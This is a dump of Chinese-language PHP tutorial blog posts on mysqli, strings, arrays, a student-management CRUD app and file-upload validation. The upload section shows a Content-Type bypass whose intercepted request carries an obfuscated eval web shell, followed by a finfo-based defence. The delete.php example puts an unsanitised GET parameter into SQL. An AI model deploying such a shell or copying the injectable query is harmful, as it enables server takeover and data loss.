参数： 1234567891011$path，要解析的路径。 $options，如果省略，返回全部单元；PATHINFO_DIRNAME，目录名称；PATHINFO_BASENAME，文件名称；PATHINFO_EXTENSION，扩展名；PATH_FILENAME，文件名。 1234&lt;?php$ext=pathinfo(&quot;/steady/upload/steady.php&quot;);print_r($ext);?&gt; 输出 1234567Array( [dirname] &#x3D;&gt; &#x2F;steady&#x2F;upload [basename] &#x3D;&gt; steady.php [extension] &#x3D;&gt; php [filename] &#x3D;&gt; steady) 检查数组中是否存在某个值 in_array()描述：检查数组中是否存在某个值 语法：bool in_array ( mixed $needle , array $arr ) 参数：$needle检索的值，$arr原数组。 生成唯一ID uniqid()描述：生成一个唯一ID 语法：string uniqid ([ string $prefix = &quot;&quot; [, bool $more_entropy = false ]] ) 参数： $prefix前缀字符串，如果省略，返回字符串长度为13； $more_entropy后缀字符串，如果为true，返回字符串长度为23。 1234&lt;?php$file_name=uniqid();echo $file_name;?&gt; 输出 1405fae4fd40b057 案例–文件上传并防御文件上传漏洞修改后缀绕过将shell.jpg修改为shell.php。 123456789&lt;?phpini_set(&#x27;display_errors&#x27;,1);if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; $_POST[&#x27;token&#x27;]==&#x27;upload&#x27;)&#123; $file_type=$_FILES[&#x27;uploadFile&#x27;][&#x27;type&#x27;]; echo &quot;当前文件类型为:&quot;.$file_type.&quot;&lt;br&gt;&quot;; $file_extension=pathinfo($_FILES[&#x27;uploadFile&#x27;][&#x27;name&#x27;],PATHINFO_EXTENSION); echo &quot;当前文件拓展名为:&quot;.$file_extension.&quot;&lt;br&gt;&quot;;&#125; 输出为： 12当前文件类型为:image/jpeg当前文件拓展名为:jpg 修改文件类型绕过上传shell.php，抓包修改类型为：image/jpeg 123456ini_set(&#x27;display_errors&#x27;,1);if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; $_POST[&#x27;token&#x27;]==&#x27;upload&#x27;)&#123; $file_type=$_FILES[&#x27;uploadFile&#x27;][&#x27;type&#x27;]; echo &quot;当前文件类型为:&quot;.$file_type.&quot;&lt;br&gt;&quot;;&#125; 正常输出是 1当前文件类型为:text&#x2F;php 抓包修改之后是： 123456789101112131415161718192021222324252627282930313233343536373839POST /upload/upload2.php HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------33083442773106276502602784153Content-Length: 654Origin: http://127.0.0.1:8888Connection: closeReferer: http://127.0.0.1:8888/upload/upload1.htmlUpgrade-Insecure-Requests: 1-----------------------------33083442773106276502602784153Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;shell.php&quot;Content-Type: text/php&lt;?phpclass User&#123; public $name = &#x27;&#x27;; public $config = null; function __destruct()&#123; @eval(&#x27;&#x27;.$config.&quot;$this-&gt;name&quot;); &#125;&#125;$user = new User;$num = @$_POST[&#x27;num&#x27;];$c = \\base64_decode((substr(@$_POST[&#x27;a&#x27;],$num,-$num)));$user-&gt;name = &#x27;&#x27;.$c;?&gt;-----------------------------33083442773106276502602784153Content-Disposition: form-data; name=&quot;token&quot;upload-----------------------------33083442773106276502602784153-- 修改为 1Content-Type: image&#x2F;jpeg 可以看到输出为： 123456789HTTP/1.1 200 OKDate: Fri, 13 Nov 2020 09:15:06 GMTServer: ApacheX-Powered-By: PHP/5.6.40Content-Length: 36Connection: closeContent-Type: text/html; charset=UTF-8文件类型为：image/jpeg&lt;br&gt; 防御方式finfo_file和finfo_open 12345678&lt;?phpini_set(&#x27;display_errors&#x27;,1);if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; $_POST[&#x27;token&#x27;]==&#x27;upload&#x27;)&#123; $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime = finfo_file($finfo,$_FILES[&#x27;uploadFile&#x27;][&#x27;tmp_name&#x27;]); echo $mime;&#125; 使用finfo_file和finfo_open之后，我们即使抓包修改文件类型，也不能通过检测。 1CR-814f85c98460f9cccd0571d91395aa8d.jpg","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP开发学习--核心编程1","slug":"PHP核心编程1","date":"2019-12-04T23:29:22.000Z","updated":"2020-11-15T09:23:04.414Z","comments":true,"path":"2019/12/05/PHP核心编程1/","link":"","permalink":"http://s1eady.top/2019/12/05/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B1/","excerpt":"","text":"PHP核心编程1PHP与数据库PHP连接MySQL服务器mysqli_connect()描述：连接到 MySQL服务器 语法：mysqli mysqli_connect([host][,username][,password][,dbname][,port]) 参数： 123456789host：MySQL服务器。可以包含端口号，默认值为“localhost:3306”username：用户名。默认值是服务器进程所有者的用户名；password：密码。dbname：数据库名称。port：MySQL服务器的端口号，默认为3306。 返回值：如果连接成功，则返回MySQLi连接对象。如果失败，则返回FALSE。 1234567891011&lt;?php//(1)数据库配置信息$db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass);var_dump($link);?&gt; 输出 12345678910111213141516171819202122object(mysqli)[1] public &#x27;affected_rows&#x27; =&gt; int 0 public &#x27;client_info&#x27; =&gt; string &#x27;mysqlnd 5.0.11-dev - 20120503 - $Id: 76b08b24596e12d4553bd41fc93cccd5bac2fe7a $&#x27; (length=79) public &#x27;client_version&#x27; =&gt; int 50011 public &#x27;connect_errno&#x27; =&gt; int 0 public &#x27;connect_error&#x27; =&gt; null public &#x27;errno&#x27; =&gt; int 0 public &#x27;error&#x27; =&gt; string &#x27;&#x27; (length=0) public &#x27;error_list&#x27; =&gt; array (size=0) empty public &#x27;field_count&#x27; =&gt; int 0 public &#x27;host_info&#x27; =&gt; string &#x27;127.0.0.1:3306 via TCP/IP&#x27; (length=25) public &#x27;info&#x27; =&gt; null public &#x27;insert_id&#x27; =&gt; int 0 public &#x27;server_info&#x27; =&gt; string &#x27;5.7.26&#x27; (length=6) public &#x27;server_version&#x27; =&gt; int 50726 public &#x27;stat&#x27; =&gt; string &#x27;Uptime: 366 Threads: 1 Questions: 83 Slow queries: 0 Opens: 110 Flush tables: 1 Open tables: 4 Queries per second avg: 0.226&#x27; (length=131) public &#x27;sqlstate&#x27; =&gt; string &#x27;00000&#x27; (length=5) public &#x27;protocol_version&#x27; =&gt; int 10 public &#x27;thread_id&#x27; =&gt; int 33 public &#x27;warning_count&#x27; =&gt; int 0 @运算符 PHP 支持一个错误控制运算符@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉(不包括语法错误)。 @ 运算符只对表达式有效。 exit()或die()描述：输出一个消息并且退出当前脚本，等同于die()。 语法：void exit ([ string $string ] ) 。 说明：输出 $string 的值，并中止程序的运行。 返回值：没有返回值。 mysqli_connect_error()描述：返回上一个 MySQL 连接产生的文本错误信息 语法：string mysqli_connect_error ( void) 参数：没有参数 1234567891011121314151617&lt;?php//(1)数据库配置信息$db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root123&quot;; //用户名，这里设置一个错误的用户名。$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass);if(!$link=@mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass))&#123; echo &quot;数据库连接错误&quot;.&quot;&lt;br&gt;&quot;; echo &quot;错误信息为:&quot;.mysqli_connect_error(); die(); echo &quot;steady is a good hacker&quot;;//该语句不会运行。&#125;?&gt; 输出 12数据库连接错误错误信息为:Access denied for user &#x27;root123&#x27;@&#x27;localhost&#x27; (using password: YES) mysqli_close()描述：关闭先前打开的数据库连接 语法：bool mysqli_close ( mysqli $link ) 选择当前数据库描述：一个数据库服务器可能包含很多的数据库，通常需要针对某个具体的数据库进行编程 语法：bool mysqli_select_db(mysqli $link, string $database) 返回值：如果成功返回TRUE，失败则返回FALSE。 123456789101112131415161718&lt;?php//(1)数据库配置信息$db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass);if(!mysqli_select_db($link,$db_name))&#123; echo &quot;&lt;h2&gt;选择数据库&#123;$db_name&#125;失败！&lt;/h2&gt;&quot;; die();&#125;else&#123; echo &quot;数据库&#123;$db_name&#125;连接成功。&quot;;&#125;?&gt; 输出 1数据库test连接成功。 设置客户端字符集描述：设置默认字符编码 语法：bool mysqli_set_charset ( mysqli $link , string $charset ) 返回：成功时返回 TRUE， 或者在失败时返回 FALSE。 执行各种SQL语句mysqli_query()描述：发送一条 MySQL 查询； 语法：resource mysqli_query(mysqli $link , string $query ) 参数： $query是查询字符串； $link是创建的活动的数据库连接； 说明：mysqli_query() 仅对 SELECT，SHOW 或 DESCRIBE 语句返回一个mysqli_result结果集对象，如果查询执行不正确则返回 FALSE。对于其它类型的 SQL 语句，mysqli_query()在执行成功时返回 TRUE，出错时返回 FALSE。非 FALSE 的返回值意味着查询是合法的并能够被服务器执行。 注意：查询字符串不应以分号结束，和命令行模式下有区别。 select语句 1234567891011121314&lt;?php//(1)数据库配置信息ini_set(&#x27;display_errors&#x27;,1); $db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass,$db_name);$sql=&quot;select * from math&quot;;$resault=mysqli_query($link,$sql);var_dump($resault);?&gt; 输出 1234567&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;steady.php:13:object(mysqli_result)[2] public &#39;current_field&#39; &#x3D;&gt; int 0 public &#39;field_count&#39; &#x3D;&gt; int 2 public &#39;lengths&#39; &#x3D;&gt; null public &#39;num_rows&#39; &#x3D;&gt; int 18 public &#39;type&#39; &#x3D;&gt; int 0 查询成功返回一个结果集，查询失败返回False。 Update语句 12345678910111213141516&lt;?php//(1)数据库配置信息ini_set(&#x27;display_errors&#x27;,1); $db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass,$db_name);$sql=&#x27;update math set name=&quot;steady&quot; where id=3&#x27;;$resault=mysqli_query($link,$sql);var_dump($resault);#$arr=mysqli_fetch_row($resault);#print_r($arr)?&gt; 输出 1&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;steady.php:13:boolean true 执行正确返回true，执行错误返回false。 mysqli_free_result()描述：释放与结果集相关联的内存 语法：void mysqli_free_result ( mysqli_result $result ) 参数：$result为结果集对象。 内存中的变量何时消失： (1)网页执行完毕，所有与本网页相关的变量自动销毁； (2)手动销毁指定的变量。 从结果集获取一行数据mysqli_fetch_row()描述：从结果集中取得一行作为枚举数组； 格式：array mysqli_fetch_row ( mysqli_result $result ) 返回：返回根据所取得的行生成的数组，如果没有更多行则返回 FALSE。 说明：mysqli_fetch_row() 从指定的结果标识关联的结果集中取得一行数据并作为数组返回。每个结果的列储存在一个数组的单元中，偏移量从 0 开始。 提示：依次调用mysqli_fetch_row()将返回结果集中的下一行，如果没有更多行则返回FALSE。 123456789101112131415161718&lt;?php//(1)数据库配置信息ini_set(&#x27;display_errors&#x27;,1); $db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass,$db_name);$sql=&#x27;select * from math&#x27;;$resault=mysqli_query($link,$sql);$arr=mysqli_fetch_row($resault);$arr1=mysqli_fetch_row($resault);print_r($arr);echo &quot;&lt;br&gt;&quot;;print_r($arr1);?&gt; 输出 12Array ( [0] &#x3D;&gt; 1 [1] &#x3D;&gt; gongxinao )Array ( [0] &#x3D;&gt; 1 [1] &#x3D;&gt; 李明 ) 1234567891011121314151617&lt;?php//(1)数据库配置信息ini_set(&#x27;display_errors&#x27;,1); $db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass,$db_name);$sql=&#x27;select * from math&#x27;;$resault=mysqli_query($link,$sql);while($arr=mysqli_fetch_row($resault))&#123; print_r($arr);&#125;?&gt; 输出 12345678910111213141516Array( [0] =&gt; 1 [1] =&gt; gongxinao)Array( [0] =&gt; 1 [1] =&gt; 李明)Array( [0] =&gt; 1 [1] =&gt; gongxinao) mysqli_fetch_assoc()描述：从结果集中取得一行作为关联数组 语法：array mysqli_fetch_assoc ( mysqli_result $result ) 返回值：从结果集取得的行生成的关联数组，如果没有更多行则返回 FALSE； 注意：此函数返回的字段名大小写敏感。 123456789101112131415&lt;?php//(1)数据库配置信息ini_set(&#x27;display_errors&#x27;,1); $db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass,$db_name);$sql=&#x27;select * from math&#x27;;$resault=mysqli_query($link,$sql);$arr=mysqli_fetch_assoc($resault);print_r($arr);?&gt; 输出 1Array ( [id] &#x3D;&gt; 1 [name] &#x3D;&gt; gongxinao ) mysqli_fetch_array()描述：从结果集中取得一行作为关联数组，或数字数组，或二者兼有； 语法：array mysqli_fetch_array ( mysqli_result $result [, int $result_type = MYSQLI_BOTH ] ) 参数：$result_type是一个常量，取值：MYSQLI_BOTH(两者兼有，默认)、MYSQLI_ASSOC(关联索引)、MYSQLI_NUM(数字索引) 返回：返回根据从结果集取得的行生成的数组，如果没有更多行则返回 FALSE。 注意：本函数返回的字段名区分大小写。 123456789101112131415&lt;?php//(1)数据库配置信息ini_set(&#x27;display_errors&#x27;,1); $db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass,$db_name);$sql=&#x27;select * from math&#x27;;$resault=mysqli_query($link,$sql);$arr=mysqli_fetch_array($resault);print_r($arr);?&gt; 输出 1Array ( [0] &#x3D;&gt; 1 [id] &#x3D;&gt; 1 [1] &#x3D;&gt; gongxinao [name] &#x3D;&gt; gongxinao ) mysqli_fetch_all()描述：从结果集中取得所有行作为关联数组、枚举数组、或二者兼有 语法：mixed mysqli_fetch_all ( mysqli_result $result [, int $resulttype = MYSQLI_NUM ] ) 获取记录数mysqli_num_rows()描述：取得结果集中行的数目 语法：int mysqli_num_rows ( mysqli_result $result ) 说明：mysqli_num_rows()返回结果集中行的数目。 注意：此命令仅对 SELECT 语句有效。 123456789101112131415&lt;?php//(1)数据库配置信息ini_set(&#x27;display_errors&#x27;,1); $db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass,$db_name);$sql=&#x27;select * from math&#x27;;$resault=mysqli_query($link,$sql);$num=mysqli_num_rows($resault);print($num);?&gt; 输出 118 mysqli_affected_rows()描述：取得前一次 MySQL 操作所影响的记录行数； 语法：int mysqli_affected_rows ( mysqli $link ) 说明：取得最近一次与 $link 关联的 SELECT、INSERT、UPDATE 或 DELETE 查询所影响的记录行数。 注意：如果最近一次查询失败，函数返回-1。当使用UPDATE查询，MySQL不会将原值和新值一样的值更新，返回值不一定就是查询条件所符合的记录，只有修改过的记录数才会被返回。 123456789101112131415&lt;?php//(1)数据库配置信息ini_set(&#x27;display_errors&#x27;,1); $db_host = &quot;127.0.0.1&quot;; //主机名 localhost:3306$db_port = &quot;3306&quot;; //端口号$db_user = &quot;root&quot;; //用户名$db_pass = &quot;root&quot;; //密码$db_name = &quot;test&quot;; //数据库名$charset = &quot;utf8&quot;; //字符集$link=mysqli_connect($db_host.&quot;:&quot;.$db_port,$db_user,$db_pass,$db_name);$sql=&#x27;select * from math&#x27;;$resault=mysqli_query($link,$sql);$num=mysqli_affected_rows($link);print(&quot;一共查询数据的行数为：&quot;.$num);?&gt; 输出 1一共查询数据的行数为：18 mysql各种获取数据函数报错总结mysqli_connect()连接成功：返回一个mysqli对象。 连接失败：返回对应的报错信息，比如如果数据库密码错误返回( ! ) Warning: mysqli_connect(): (HY000/1045): Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES) in /Applications/MAMP/htdocs/phpinfo.php on line *10*。 mysqli_query()SELECT，SHOW 或 DESCRIBE 语句查询成功：返回一个结果集。mysqli_result。 查询失败：返回false，boolean false。 其它类型的 SQL 语句查询成功：返回true。 查询失败：返回false。 mysqli_fetch_all()、mysqli_fetch_array()、mysqli_fetch_assoc()、mysqli_fetch_row()接受参数为数据库语句执行产生的结果集，一般的报错就是因为数据库语句执行失败导致，最常见的报错语句为： 1Warning: mysqli_fetch_all() expects parameter 1 to be mysqli_result, boolean given in &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;phpinfo.php on line 13 mysqli_num_rows()常见错误 1Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;phpinfo.php on line 13 以上报错的基础是php开启了报错模式。比如 1ini_set(&#x27;display_errors&#x27;,0); 学生管理系统创建数据库1234567891011121314151617181920212223242526mysql&gt; create table student( -&gt; id int(10), -&gt; name varchar(20), -&gt; sex enum(&#x27;男&#x27;,&#x27;女&#x27;), -&gt; age tinyint(4), -&gt; edu enum(&#x27;初中&#x27;,&#x27;高中&#x27;,&#x27;大专&#x27;,&#x27;大本&#x27;,&#x27;研究生&#x27;), -&gt; salary float(8,2) unsigned, -&gt; bonus float(6,2) unsigned, -&gt; city varchar(32) -&gt; );Query OK, 0 rows affected (0.04 sec)mysql&gt; desc student;+--------+-------------------------------------------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------+-------------------------------------------------------+------+-----+---------+-------+| id | int(10) | YES | | NULL | || name | varchar(20) | YES | | NULL | || sex | enum(&#x27;男&#x27;,&#x27;女&#x27;) | YES | | NULL | || age | tinyint(4) | YES | | NULL | || edu | enum(&#x27;初中&#x27;,&#x27;高中&#x27;,&#x27;大专&#x27;,&#x27;大本&#x27;,&#x27;研究生&#x27;) | YES | | NULL | || salary | float(8,2) unsigned | YES | | NULL | || bonus | float(6,2) unsigned | YES | | NULL | || city | varchar(32) | YES | | NULL | |+--------+-------------------------------------------------------+------+-----+---------+-------+8 rows in set (0.01 sec) 输入信息 1mysql&gt; insert into student (id,name,sex,age,edu,salary,bonus,city) values(1,&#39;steady&#39;,&#39;男&#39;,18,&#39;初中&#39;,8000,8999,&#39;烟台&#39;); 数据库连接文件–coon.php12345678910111213&lt;?php$db_addr=&quot;127.0.0.1&quot;;$db_port=&quot;3306&quot;;$db_name=&quot;test&quot;;$db_charset=&quot;utf-8&quot;;$db_user=&quot;root&quot;;$dn_passwd=&quot;root&quot;;if(!$link=@mysqli_connect($db_addr.&quot;:&quot;.$db_port,$db_user,$dn_passwd,$db_name))&#123; echo &quot;数据库连接错误。&quot;; die();&#125;?&gt; 学生信息列表显示文件–listt.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?php//包含连接数据库的公共文件require_once(&quot;./coon.php&quot;);//执行查询的SQL语句$sql = &quot;SELECT * FROM student ORDER BY id DESC&quot;;$result = mysqli_query($link,$sql);//获取所有行数据$arrs = mysqli_fetch_all($result,MYSQLI_ASSOC);//获取学生人数$records = mysqli_num_rows($result);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;学生信息管理中心&lt;/title&gt;&lt;script type=&quot;text/javascript&quot;&gt;//定义一个JS的提示函数function confirmDel(id)&#123; //询问是否要删除？ if(window.confirm(&quot;你真的要删除吗？&quot;)) &#123; //如果单击&quot;确定&quot;按钮，跳转到delete.php页面 location.href = &quot;./delete.php?id=&quot;+id; &#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;padding-bottom: 10px;&quot;&gt; &lt;h2&gt;学生信息管理中心&lt;/h2&gt; &lt;a href=&quot;./add.php&quot;&gt;添加学生&lt;/a&gt; 共有&lt;font color=red&gt;&lt;?php echo $records?&gt;&lt;/font&gt;个学生信息&lt;/div&gt;&lt;table width=&quot;600&quot; border=&quot;1&quot; align=&quot;center&quot; rules=&quot;all&quot; cellpadding=&quot;5&quot;&gt; &lt;tr bgcolor=&#x27;#ccc&#x27;&gt; &lt;th&gt;编号&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;学历&lt;/th&gt; &lt;th&gt;工资&lt;/th&gt; &lt;th&gt;奖金&lt;/th&gt; &lt;th&gt;籍贯&lt;/th&gt; &lt;th&gt;操作选项&lt;/th&gt; &lt;/tr&gt; &lt;?php //循环二维数组 foreach($arrs as $arr)&#123; ?&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;id&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;name&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;sex&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;age&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;edu&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;salary&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;bonus&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;city&#x27;]?&gt;&lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&quot;&gt;修改&lt;/a&gt; | &lt;a href=&quot;#&quot; onClick=&quot;confirmDel(&lt;?php echo $arr[&#x27;id&#x27;]?&gt;)&quot;&gt;删除&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;?php &#125;?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 学生信息删除文件–deletee.php 12345678910&lt;?phprequire_once(&#x27;./coon.php&#x27;);$id=$_GET[&#x27;id&#x27;];$sql=&quot;delete from student where id=$id&quot;;if(mysqli_query($link,$sql))&#123; echo &quot;学生id为&#123;$id&#125;的信息删除成功。&quot;; header(&quot;refresh:3;url=./listt.php&quot;); die();&#125;?&gt; 删除学生信息操作12345678910&lt;?phprequire_once(&#x27;./coon.php&#x27;);$id=$_GET[&#x27;id&#x27;];$sql=&quot;delete from student where id=$id&quot;;if(mysqli_query($link,$sql))&#123; echo &quot;学生id为&#123;$id&#125;的信息删除成功。&quot;; header(&quot;refresh:3;url=./listt.php&quot;); die();&#125;?&gt;","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP开发学习--PHP基础3","slug":"PHP开发学习--PHP基础3","date":"2019-11-12T23:29:22.000Z","updated":"2020-11-15T09:22:31.679Z","comments":true,"path":"2019/11/13/PHP开发学习--PHP基础3/","link":"","permalink":"http://s1eady.top/2019/11/13/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0--PHP%E5%9F%BA%E7%A1%803/","excerpt":"","text":"PHP基础字符串详解4种不同形式的字符串单引号字符串形式： 1$s1 &#x3D; &#39;字符串内容&#39; 特点： 123只能使用2个转义符：&#96;\\\\&#96;（代表一个反斜杠） &#96;\\’&#96;（代表一个单引号）通常，如果没有其他特殊需求（比如字符串中使用一些转义符，以及一些变量），则推荐使用单引号字符串。 双引号字符串形式： 1$s1 &#x3D; &quot;字符串内容&quot; 特点： 123456789101、能使用较为丰富的转义符，包括：\\\\ \\&quot; \\n \\r \\t \\$等\\n ：代表&quot;换行符&quot;（就是一个新行）\\r ：代表“回车符”（其实也是一个新行）\\t ：代表&quot;tab符&quot;，\\$ ：代表&quot;$&quot;本身，因为双引号字符串中能识别（解析）变量，则如果不想要去解析，就用此转义！$v1 &#x3D; 10;echo &quot;结果为：$v1&quot;; &#x2F;&#x2F;输出内容为： 结果为：10echo &quot;结果为：\\$v1&quot;; &#x2F;&#x2F;输出内容为： 结果为：$v12、&quot;&quot;$&quot;符号在其中会被识别为是变量的起始符号，并试图读取变量值——即能识别变量；3、识别其中变量，建议使用大括号括起来，类似这样：&#123;$变量名&#125;， &#123;$数组[&#39;下标&#39;]&#125; heredoc字符串形式：$s1 = &lt;&lt;&lt;”标识符” nowdoc字符串形式：$s1 = &lt;&lt;&lt;’标识符’ heredoc字符串，和nowdoc字符串，适用于表达（描述）一大段内容的字符串，特别是适合于写html部分的代码（含js，css等）。 12345$html1=&lt;&lt;&lt;&quot;名字&quot;&lt;script&gt; var v1=1+3;&lt;/script&gt;名字; 常用字符串函数字符串输出1234echo： 输出一个或多个字符（不是函数，是语言结构）print：输出一个字符串print_r：输出变量的较为详细的信息var_dump：输出变量的完整信息 数组详解数组的概念和定义数组有如下几种定义形式： 123456789101112形式1：$arr1 &#x3D; array(单元1，单元2，...）；形式2：$arr2 &#x3D; [单元1，单元2，...]；单元（元素）的形式为： [下标&#x3D;&gt;]值形式3：（不推荐）$arr3[下标1] &#x3D; 值1；$arr3[下标2] &#x3D; 值2；...... 数据取值的语法形式： $数组名[下标];//其中，下标可以是整数的，也可以是字符串的（注意有引号）。 索引数组通常是指一个数组的下标是从0开始的连续的整数。 123456举例1：$arr1 &#x3D; array(5, 8, 12, 2, 3);$arr2 &#x3D; [8, 22, 24, 22, 12];$arr3[ ] &#x3D; 8;$arr3[ ] &#x3D; 24;$arr3[ ] &#x3D; 22; 关联数组通常是指一个数组的下标都是字符串。 1234567$person &#x3D; array(‘name’&#x3D;&gt;’张三’， ‘age’&#x3D;&gt;18, ‘edu’&#x3D;&gt; ‘大学’, ‘salary’&#x3D;&gt;10000, ‘from’&#x3D;&gt;’北京’,); PHP数组的维数一维、二维、三维。 数组的遍历使用foreach语句遍历数组1234567&lt;?php$steady=array(1,2,3,4,5,6);foreach($steady as $key =&gt; $value)&#123; echo &quot;&lt;br&gt;$key=&gt;$value&quot;;&#125;?&gt; 输出 1234560=&gt;11=&gt;22=&gt;33=&gt;44=&gt;55=&gt;6 使用for循环语句遍历数组php中，有如下几个函数，可以针对数组指针进行相应操作： 123456$re &#x3D; current( $arr1); &#x2F;&#x2F;取得数组中当前指针所在单元的值；$re &#x3D; key( $arr1 ); &#x2F;&#x2F;取得数组中当前指针所在单元的键（下标）；$re &#x3D; next( $arr1 ); &#x2F;&#x2F;将数组中的指针往后移动一个位置，并取得新位置上的值；$re &#x3D; prev( $arr1 ); &#x2F;&#x2F;将数组中的指针往前移动一个位置，并取得新位置上的值；$re &#x3D; end( $arr1 ); &#x2F;&#x2F;将数组中的指针移动到最后一个位置，并取得新位置上的值；$re &#x3D; reset($arr1); 